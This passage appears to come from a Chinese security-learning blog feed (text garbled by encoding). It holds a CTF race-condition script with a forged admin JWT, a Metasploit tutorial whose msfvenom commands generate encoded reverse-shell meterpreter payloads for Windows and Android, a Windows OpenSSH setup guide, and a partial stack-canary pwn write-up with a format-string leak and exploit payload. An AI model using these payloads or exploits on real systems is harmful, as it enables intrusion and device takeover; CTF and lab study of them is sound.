class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.LxCAaYZoEHhEzz26avKldy1azGXTX_XKQNBtSLn9QgY&quot;</span></span><br><span class="line">    </span><br><span class="line">    success = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">flood_guest</span>():</span><br><span class="line">        <span class="keyword">nonlocal</span> success</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: malicious_token&#125;, timeout=<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">try_admin</span>():</span><br><span class="line">        <span class="keyword">nonlocal</span> success</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            <span class="keyword">if</span> success:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(url + <span class="string">&#x27;/admin&#x27;</span>, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: admin_token&#125;, timeout=<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[SUCCESS] æ‰¾åˆ°flag: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">                    success = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">&quot;Welcome Back, &#123;&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[!] SSTIè§¦å‘ä½†æœªæˆåŠŸ: <span class="subst">&#123;r.text[:<span class="number">100</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] å¯åŠ¨ç²¾ç¡®ç«äº‰æ”»å‡»...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    t1 = threading.Thread(target=flood_guest)</span><br><span class="line">    t2 = threading.Thread(target=try_admin)</span><br><span class="line">    </span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    </span><br><span class="line">    t2.join()</span><br><span class="line">    t1.join()</span><br><span class="line"></span><br><span class="line">precise_race_attack()</span><br></pre></td></tr></table></figure><img src="976833b3919881515e17650eeba314e9.png" alt="09fe970a-f75d-45fa-bd63-bde8d2a85d32.png"  />]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MSFçš„ä½¿ç”¨</title>
      <link href="/ghsc_ovo_0721/MSF%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/MSF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="MFS"><a href="#MFS" class="headerlink" title="MFS"></a>MFS</h1><p>Metasploit ç®€ç§°ï¼ˆMSFï¼‰æ˜¯ä¸€æ¬¾æµè¡Œçš„å¼€æºæ¸—é€æµ‹è¯•æ¡†æ¶ï¼Œç”±Rapid7å…¬å¸å¼€å‘ï¼Œå¯ä»¥å¸®åŠ©å®‰å…¨å’ŒITä¸“ä¸šäººå£«è¯†åˆ«å®‰å…¨æ€§é—®é¢˜ï¼ŒéªŒè¯æ¼æ´çš„ç¼“è§£æªæ–½ï¼Œå¹¶ç®¡ç†ä¸“å®¶é©±åŠ¨çš„å®‰å…¨æ€§è¿›è¡Œè¯„ä¼°ï¼Œæä¾›çœŸæ­£çš„å®‰å…¨é£é™©æƒ…æŠ¥ã€‚å¹¶ä¸”è¯¥æ¡†æ¶è¿˜æä¾›äº†ä¸€ç³»åˆ—æ”»å‡»æ¨¡å—å’ŒPayloadå·¥å…·ï¼Œå¯ç”¨äºæ¼æ´åˆ©ç”¨ã€åŠæ¼æ´æ”»å‡»ã€‚åŒæ—¶è½¯ä»¶è‡ªèº«æ”¯æŒå¤šç§æ“ä½œç³»ç»Ÿå¹³å°ï¼ŒåŒ…æ‹¬Windowsã€Linuxã€MacOSç­‰ã€‚ç›´åˆ°ä»Šå¤©Metasploitå·²æˆä¸ºä¼—å¤šé»‘å®¢æ‰‹ä¸­æ¸—é€æ”»å‡»çš„åˆ©å™¨ï¼Œå¹¶åœ¨å®‰å…¨é¢†åŸŸå¤§å±•èº«æ‰‹ã€‚</p><p>Metasploitæ¡†æ¶ä¸»è¦åŒ…å«ä»¥ä¸‹å‡ ä¸ªç»„ä»¶ï¼š</p><p>æ¨¡å—åº“ï¼šåŒ…å«äº†ä¸€ç³»åˆ—æ”»å‡»æ¨¡å—å’ŒPayloadå·¥å…·ï¼Œç”¨æˆ·å¯ä»¥åˆ©ç”¨è¿™äº›æ¨¡å—å¿«é€Ÿæ„é€ æ”»å‡»ä»£ç ã€‚</p><ul><li>Payloadç”Ÿæˆå™¨ï¼šæ”¯æŒç”Ÿæˆå¤šç§ç±»å‹çš„Payloadï¼ŒåŒ…æ‹¬åå‘Shellã€Meterpreterã€WebShellç­‰ã€‚</li><li>æ¸—é€æµ‹è¯•å·¥å…·ï¼šæ”¯æŒå¤šç§æ¸—é€æµ‹è¯•æŠ€æœ¯ï¼ŒåŒ…æ‹¬ç«¯å£æ‰«æã€æ¼æ´æ‰«æã€å¯†ç ç ´è§£ç­‰ã€‚</li><li>æ•°æ®åº“ï¼šç”¨äºå­˜å‚¨Metasploitæ¡†æ¶çš„æ•°æ®å’Œæ”»å‡»ç»“æœï¼ŒåŒ…æ‹¬æ¨¡å—ä¿¡æ¯ã€ä¸»æœºä¿¡æ¯ã€æ¼æ´ä¿¡æ¯ç­‰ã€‚</li><li>æ’ä»¶ç³»ç»Ÿï¼šæ”¯æŒè‡ªå®šä¹‰æ’ä»¶ï¼Œå¯ä»¥æ‰©å±•Metasploitçš„åŠŸèƒ½ã€‚</li></ul><h2 id="æœ¬æ¬¡çš„ç’°å¢ƒ"><a href="#æœ¬æ¬¡çš„ç’°å¢ƒ" class="headerlink" title="æœ¬æ¬¡çš„ç’°å¢ƒ"></a>æœ¬æ¬¡çš„ç’°å¢ƒ</h2><p>ç”¨çš„æ˜¯Kali Linux (2024.1) , å…§æœ‰MSF , å¦‚æœæ²’æœ‰å®‰è£ç”¨:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \</span><br><span class="line">  chmod 755 msfinstall &amp;&amp; \</span><br><span class="line">  ./msfinstall</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹Kali Linux ç³»ç»ŸIPåœ°å€:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure><p>å¯ä»¥pingä¸€ä¸‹ç¢ºèªæ˜¯å¦èƒ½é€£æ¥</p><h3 id="1-é–‹å•ŸMFS"><a href="#1-é–‹å•ŸMFS" class="headerlink" title="1.é–‹å•ŸMFS"></a>1.é–‹å•ŸMFS</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><img src="b3f76b0bef73f1c0939cd5e094b504de.png" alt="5bb5f421-78a1-49fa-970b-e7291b9ee6de.png" style="zoom:50%;" /><br/><h2 id="2-ç”¨åˆ°msfvenomå‘½ä»¤"><a href="#2-ç”¨åˆ°msfvenomå‘½ä»¤" class="headerlink" title="2.ç”¨åˆ°msfvenomå‘½ä»¤"></a>2.ç”¨åˆ°msfvenomå‘½ä»¤</h2><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>-p</td><td>æŒ‡å®šéœ€è¦ä½¿ç”¨çš„payload</td></tr><tr><td>-l</td><td>åˆ—å‡ºæŒ‡å®šæ¨¡å—çš„æ‰€æœ‰å¯ç”¨èµ„æº</td></tr><tr><td>-n</td><td>ä¸ºpayloadé¢„å…ˆæŒ‡å®šä¸€ä¸ªNOPæ»‘åŠ¨é•¿åº¦ï¼Œç”¨äºé˜²æ­¢ç¨‹åºå´©æºƒã€‚</td></tr><tr><td>-f</td><td>æŒ‡å®šè¾“å‡ºæ ¼å¼ï¼Œä¾‹å¦‚exeã€elfã€phpã€jsç­‰ã€‚</td></tr><tr><td>-e</td><td>æŒ‡å®šéœ€è¦ä½¿ç”¨çš„encoderç¼–ç å™¨ï¼Œä»¥éšè—æ¶æ„ä»£ç ã€‚</td></tr><tr><td>-a</td><td>æŒ‡å®špayloadçš„ç›®æ ‡æ¶æ„ï¼Œä¾‹å¦‚x86ã€x64ç­‰ã€‚</td></tr><tr><td>â€“platform</td><td>æŒ‡å®špayloadçš„ç›®æ ‡å¹³å°ï¼Œä¾‹å¦‚Windowsã€Linuxç­‰ã€‚</td></tr><tr><td>-s</td><td>è®¾å®šæœ‰æ•ˆæ”»å‡»è·è½½çš„æœ€å¤§é•¿åº¦ã€‚</td></tr><tr><td>-b</td><td>è®¾å®šè§„é¿å­—ç¬¦é›†ï¼Œä»¥é˜²æ­¢ç”Ÿæˆçš„payloadä¸­åŒ…å«ä¸å¯ç”¨å­—ç¬¦ã€‚</td></tr><tr><td>-i</td><td>æŒ‡å®špayloadçš„ç¼–ç æ¬¡æ•°ã€‚</td></tr><tr><td>â€“shellest</td><td>æœ€å°åŒ–ç”Ÿæˆpayloadã€‚</td></tr></tbody></table><p>ä¾‹å­:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp ... #é€™æ˜¯æŒ‡å®šandroidçš„</span><br></pre></td></tr></table></figure><p>-e ç¼–ç å™¨ :</p><table><thead><tr><th>Encoder</th><th>æè¿°</th></tr></thead><tbody><tr><td>alphanum</td><td>ä½¿ç”¨å­—æ¯æ•°å­—å­—ç¬¦å¯¹ä»£ç è¿›è¡Œç¼–ç ã€‚</td></tr><tr><td>alpha_upper</td><td>ä½¿ç”¨å¤§å†™å­—æ¯å­—ç¬¦å¯¹ä»£ç è¿›è¡Œç¼–ç ã€‚</td></tr><tr><td>fnstenv_mov</td><td>ä½¿ç”¨FPUæŒ‡ä»¤å¯¹ä»£ç è¿›è¡Œç¼–ç ã€‚</td></tr><tr><td>jmp_call_additive</td><td>ä½¿ç”¨è·³è½¬æŒ‡ä»¤å’Œè°ƒç”¨æŒ‡ä»¤å¯¹ä»£ç è¿›è¡Œç¼–ç ã€‚</td></tr><tr><td>nonalpha</td><td>ä½¿ç”¨éå­—æ¯å­—ç¬¦å¯¹ä»£ç è¿›è¡Œç¼–ç ã€‚</td></tr><tr><td>nonupper</td><td>ä½¿ç”¨éå¤§å†™å­—æ¯å­—ç¬¦å¯¹ä»£ç è¿›è¡Œç¼–ç ã€‚</td></tr><tr><td>unicode_upper</td><td>ä½¿ç”¨Unicodeå­—ç¬¦å¯¹ä»£ç è¿›è¡Œç¼–ç ã€‚</td></tr></tbody></table><br/><p>åŸæ•´ä¾‹å­:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp \</span><br><span class="line">lhost=127.0.0.1 lport=9999 -e x86/shikata_ga_nai -i 3 -b &#x27;\x00\x0a\xff&#x27; -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -b&#x27;\x0\x0b&#x27; \</span><br><span class="line">lhost=127.0.0.1 lport=9999 -f dll &gt; payload.dll</span><br><span class="line"></span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp \</span><br><span class="line">lhost=127.0.0.1 lport=9999 R&gt; /home/kali/payload.apk</span><br></pre></td></tr></table></figure><img src="bfd5d40ce1dd2d43839f515453278d34.png" alt="bfd5d40ce1dd2d43839f515453278d34.png" /><br/><h1 id="Android-èˆŠç‰ˆ"><a href="#Android-èˆŠç‰ˆ" class="headerlink" title="Android(èˆŠç‰ˆ)"></a>Android(èˆŠç‰ˆ)</h1><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp \</span><br><span class="line">lhost=127.0.0.1 lport=9999 R&gt; /home/kali/payload.apk</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆå¾Œç™¼å»androidæ©Ÿä¸Š, å°å¼Ÿç¶“è²»æœ‰é™ï¼Œåªèƒ½ç”¨æ¨¡æ“¬å™¨äº†ï¼ˆå“­ï¼‰ï¼Œä¸‹å­¸æœŸå†è²·å®‰å“</p><img src="760a1a839fb9e2900d4432e2e5ca3567.png" alt="760a1a839fb9e2900d4432e2e5ca3567.png" /><p>åœ¨kaliä¸‹æ‰“é–‹ç›£è½ç¨‹åº:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><p>è¨­ç½®payload:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload android/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>è¨­ç½®IPå’ŒPORT:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set lhost 127.0.0.1 </span><br><span class="line">set lport 9999</span><br></pre></td></tr></table></figure><img src="7eb4d3cd6755f16979b18344330280f9.png" alt="7eb4d3cd6755f16979b18344330280f9.png" /><p>å•Ÿå‹•:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><img src="248fd01720495a2c02eff0136b06c7f7.png" alt="248fd01720495a2c02eff0136b06c7f7.png" /><img src="191e22ecdb18f6a6524a329b7cde4045.png" alt="191e22ecdb18f6a6524a329b7cde4045.png" /><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app_list #æŸ¥çœ‹app</span><br></pre></td></tr></table></figure><img src="2d92f2b5a0c7e03d30f646a2c5c9ec83.png" alt="2d92f2b5a0c7e03d30f646a2c5c9ec83.png" /><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app_run [package] #è‡ªå·±å–œæ­¡é–‹ä»€éº¼å°±é–‹ä»€éº¼</span><br></pre></td></tr></table></figure><img src="7ad85d147861dd3d99eef0f1d8fe540f.png" alt="7ad85d147861dd3d99eef0f1d8fe540f.png" />]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenSSHçš„ä½¿ç”¨(Windows)</title>
      <link href="/ghsc_ovo_0721/OpenSSH%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/OpenSSH%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenSSHçš„ä½¿ç”¨-Windows"><a href="#OpenSSHçš„ä½¿ç”¨-Windows" class="headerlink" title="OpenSSHçš„ä½¿ç”¨(Windows)"></a>OpenSSHçš„ä½¿ç”¨(Windows)</h1><p>vscode æ˜¯æœ€å¥½çš„IDE!!!</p><p>ä»¥ä¸‹æ˜¯ç”¨vscode çš„remote ssh å’Œwindows åŠŸèƒ½ OpenSSH ä¾†å¯¦ç¾é ç¨‹æ§åˆ¶ </p><p>é€™æ˜¯ä¸€å€‹for windows10çš„ä½¿ç”¨çš„SSHç­†è¨˜:</p><h2 id="ä¸‹è¼‰vscode"><a href="#ä¸‹è¼‰vscode" class="headerlink" title="ä¸‹è¼‰vscode"></a>ä¸‹è¼‰vscode</h2><p><a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p><h2 id="ä¸‹è¼‰remote-ssh"><a href="#ä¸‹è¼‰remote-ssh" class="headerlink" title="ä¸‹è¼‰remote ssh"></a>ä¸‹è¼‰remote ssh</h2><p>åœ¨vscode æœå°‹remote ssh ä¸‹è¼‰ :</p><img src="95d949cb995b83b10d44c4e0f41288e9.png" alt="95d949cb995b83b10d44c4e0f41288e9.png" /><p>ç”¨æ³•å¾ˆç°¡å–®:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh [username]@[localhost]</span><br></pre></td></tr></table></figure><p>å¯ä»¥åœ¨æƒ³è¦é ç¨‹çš„æœ¬æ©Ÿæœå°‹(windows):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p>ipconfigé¸WIFIçš„åœ°å€</p><h2 id="é–‹å•ŸOpenSSH"><a href="#é–‹å•ŸOpenSSH" class="headerlink" title="é–‹å•ŸOpenSSH"></a>é–‹å•ŸOpenSSH</h2><p>é–‹å•ŸOpenSSHçš„åŠŸèƒ½,æœ‰ä¸€äº›windowsæœ‰å…§å»ºåŠŸèƒ½çš„,å¯ä»¥åƒè€ƒé€™ä¸€ç¯‡åšå®¢:<br><a href="https://blog.csdn.net/nl9788/article/details/131653284">https://blog.csdn.net/nl9788/article/details/131653284</a></p><p> , å¦‚æœæ²’æœ‰çš„è©±è·Ÿè‘—ä»¥ä¸‹æ­¥é©Ÿ:</p><p>åœ¨Githubä¸‹è¼‰OpenSSH:</p><p><a href="https://github.com/PowerShell/Win32-OpenSSH/releases/tag/10.0.0.0p2-Preview">https://github.com/PowerShell/Win32-OpenSSH/releases/tag/10.0.0.0p2-Preview</a></p><img src="730119a2fe8c3e11eb34774422de1402.png" alt="730119a2fe8c3e11eb34774422de1402.png" /><p>æ‰¾åˆ°åˆé©çš„ç‰ˆæœ¬ , æ–°å»ºä¸€å€‹æ–‡ä»¶å¤¾åœ¨<code>&quot;C:\Program Files\OpenSSH&quot;</code> , copyåœ¨é€™æ–‡ä»¶å¤¾ä¸Š</p><p>è§£å£“, ç”¨ç®¡ç†å“¡æ¨¡å¼é–‹å•Ÿpowershell , <code>cd &quot;C:\Program Files\OpenSSH&quot;</code> </p><img src="1e1498579227228e18604757f6b919b7.png" alt="1e1498579227228e18604757f6b919b7.png" /><p>ç”¨<code>.\install-sshd.ps1</code>å®‰è£ </p><p>å®‰è£å®Œæˆå¾Œï¼Œé…ç½®é˜²ç«å¢™ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-NetFirewallRule -Name sshd -DisplayName &#x27;OpenSSH Server (sshd)&#x27; -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22</span><br></pre></td></tr></table></figure><p>è¨­å®šè‡ªå‹•å•Ÿç”¨ OpenSSH:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-Service sshd | Set-Service -StartupType Automatic -PassThru</span><br><span class="line">Start-Service sshd</span><br></pre></td></tr></table></figure><p>é©—è­‰ OpenSSH æ˜¯å¦æ­£åœ¨åŸ·è¡Œ:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-service sshd</span><br></pre></td></tr></table></figure><img src="607be35ba7f14a88fa23a5789d32ba64.png" alt="607be35ba7f14a88fa23a5789d32ba64.png" /><p>ç„¶å¾Œå°±å¯ä»¥ç”¨vscodeä¾†sshé€£æ¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStar2023_Canary</title>
      <link href="/ghsc_ovo_0721/NewStar2023-Canary/"/>
      <url>/ghsc_ovo_0721/NewStar2023-Canary/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Canary-æ˜¯ä»€éº¼ï¼Ÿ"><a href="#1-Canary-æ˜¯ä»€éº¼ï¼Ÿ" class="headerlink" title="1. Canary æ˜¯ä»€éº¼ï¼Ÿ"></a>1. Canary æ˜¯ä»€éº¼ï¼Ÿ</h2><p>Canary (é‡‘çµ²é›€) æ˜¯ä¸€ç¨®ç”¨ä¾†é˜²æ­¢ç·©è¡å€æº¢ä½æ”»æ“Šçš„ä¿è­·æ©Ÿåˆ¶ã€‚ç¨‹å¼æœƒåœ¨å‡½å¼é–‹å§‹æ™‚åœ¨å †ç–Šä¸Šæ”¾ç½®ä¸€å€‹éš¨æ©Ÿçš„å€¼ (Canary)ï¼Œä¸¦åœ¨å‡½å¼è¿”å›å‰æª¢æŸ¥é€™å€‹å€¼æ˜¯å¦è¢«æ”¹è®Šã€‚å¦‚æœè¢«æ”¹è®Šï¼Œè¡¨ç¤ºç™¼ç”Ÿäº†ç·©è¡å€æº¢ä½ï¼Œç¨‹å¼æœƒç«‹å³çµ‚æ­¢ã€‚</p><p>åœ¨ 32 ä½å…ƒç¨‹å¼ä¸­ï¼ŒCanary é€šå¸¸æ˜¯ä¸€å€‹ 4 ä½å…ƒçµ„çš„å€¼ï¼Œä¸¦ä¸”ä»¥ <code>\x00</code> çµå°¾ã€‚å®ƒè¢«æ”¾åœ¨ saved EBP (èˆŠçš„ EBP) å’Œå€åŸŸè®Šæ•¸ä¹‹é–“ã€‚</p><h2 id="2-çœ‹çœ‹ç¨‹å¼çš„è³‡è¨Š"><a href="#2-çœ‹çœ‹ç¨‹å¼çš„è³‡è¨Š" class="headerlink" title="2.çœ‹çœ‹ç¨‹å¼çš„è³‡è¨Š"></a>2.çœ‹çœ‹ç¨‹å¼çš„è³‡è¨Š</h2><img src="925cf0f80b5f3bad48b8b9ca73cf5957.png" alt="925cf0f80b5f3bad48b8b9ca73cf5957.png" /><p>æ˜¯ä¸€å€‹64ä½çš„ELF , é–‹äº†NX å’ŒCANARY å’Œ RELERO</p><p>ä»Šæ¬¡æˆ‘å€‘è¦å­¸ç¿’å¦‚ä½•ç”¨pwndbgä¾†æ‰¾å‡ºcanary</p><p>å…ˆçœ‹çœ‹IDAçš„å½ä»£ç¢¼:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[40]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  puts(&quot;Welcome to NewStar CTF!!&quot;);</span><br><span class="line">  puts(&quot;Give me some gift?&quot;);</span><br><span class="line">  read(0, buf, 0x20u);</span><br><span class="line">  puts(&quot;Oh thanks,There is my gift:&quot;);</span><br><span class="line">  printf(buf);</span><br><span class="line">  puts(&quot;Show me your magic&quot;);</span><br><span class="line">  read(0, buf, 0x100u);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è¦‹æœ‰å…©å€‹readå‡½æ•¸ å’Œä¸€å€‹printfå‡½æ•¸ ,  read(0, buf, 0x20u); ç¬¬ä¸€å€‹çš„readè®€å–20å€‹å­—ç¯€(u) , ç¬¬äºŒå€‹100å­—ç¯€(u) , ç”±æ–¼é–‹äº†NX ä¸èƒ½ç”¨shellcode , è¦ç”¨å¾Œé–€å‡½æ•¸æˆ–ROPéˆ , </p><p>åœ¨IDAç™¼ç¾äº†backdoorå‡½æ•¸:</p><img src="375c9a3e1f280ef206960f1bfaa90216.png" alt="375c9a3e1f280ef206960f1bfaa90216.png" /><img src="91ac1c6d344675c4fdab435647931ac9.png" alt="91ac1c6d344675c4fdab435647931ac9.png" /><p>backdoor : 0x401262 </p><p>æˆ‘å€‘è¦åœ¨printæ‰¾åˆ°canary å†ç”¨recvuntil()æˆªå–åœ°å€ , æœ€å¾Œåœ¨payload ä¸­åŠ å…¥canary</p><p>é¦–å…ˆå«å‡ºå‰å¤§çš„gdbå¤§äºº , ä¸‹ä¸€å€‹æ–·é»åœ¨read å‡½æ•¸é‚£:</p><img src="1543c2757effce1d49829104a1a8b3f0.png" alt="1543c2757effce1d49829104a1a8b3f0.png" /><ol><li>b* main </li><li>b *0x401310</li><li>b *0x401335</li><li>b *0x40135A</li><li>cyclic 20 ç”Ÿæˆä¸€å€‹20å­—ç¯€çš„å­—ç¬¦ä¸² , çœ‹çœ‹cyclic </li><li>stack 30</li></ol><img src="5ff12d98052698996f80eff1c506df62.png" alt="5ff12d98052698996f80eff1c506df62.png" /><p>0x00 æ˜¯ canary å°é‡‘çµ²é³¥æ˜¯00 , ä¸é›£çœ‹ åœ¨ rbp-0x8é‚£æœ‰ä¸€å€‹00 åœ°å€æ˜¯: 0x7fffffffd598</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">05:0028â”‚-008     0x7fffffffd598 â—‚â€” 0x2ae9f13115290200</span><br></pre></td></tr></table></figure><p>åœ¨gdb canaryä¸€ä¸‹æ²’å‡ºä¾† :<br><img src="07b6e380a5d375a6276f404ec46e2f42.png" alt="07b6e380a5d375a6276f404ec46e2f42.png" /></p><p>â€“all ä¸€ä¸‹ : å‡ºä¾†æ</p><img src="078ebb6ca03cf8249cb81d4562e25bef.png" alt="078ebb6ca03cf8249cb81d4562e25bef.png" /><p>åœ¨-008é‚£ , é‚£éº¼ç®—ä¸€ç®—åç§»é‡:  5 </p><img src="67d1a20f339b7c34c181e34ab985583b.png" alt="67d1a20f339b7c34c181e34ab985583b.png" /><img src="8d0f4205b9f19924d5d45ed3846f9121.png" alt="8d0f4205b9f19924d5d45ed3846f9121.png" /><p>16*6 æ˜¯canary , &#x2F;16 &#x3D; 6 </p><p>ä¸é›£çœ‹å‡ºå­—ç¬¦ä¸²åç§»é‡ç‚º6 , 6+5 &#x3D; %11$p</p><p>ç¾åœ¨å¯«ä¸€å¯«payloadæ€è·¯ :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">b&#x27;aaaaaa %11$p&#x27;</span>)</span><br></pre></td></tr></table></figure><img src="ffa12e0ad0da22c35e68de34f82120e3.png" alt="ffa12e0ad0da22c35e68de34f82120e3.png" /><p>æˆåŠŸæ‰“å°å‡ºä¾†äº† , </p><img src="55b2f70596f9090b7b0ab3303559a784.png" alt="55b2f70596f9090b7b0ab3303559a784.png" /><p>é‚£æˆ‘å¯ä»¥å¯«ä¸€ä¸‹payload äº† , åƒåœ¾æ•¸æ“š+canary+rbp(0x8)+è¿”å›åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x98</span>-<span class="number">0x70</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(shell_addr)</span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node5.anna.nssctf.cn&#x27;, 22047)</span></span><br><span class="line">p = process(<span class="string">&quot;./canary&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./canary&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span 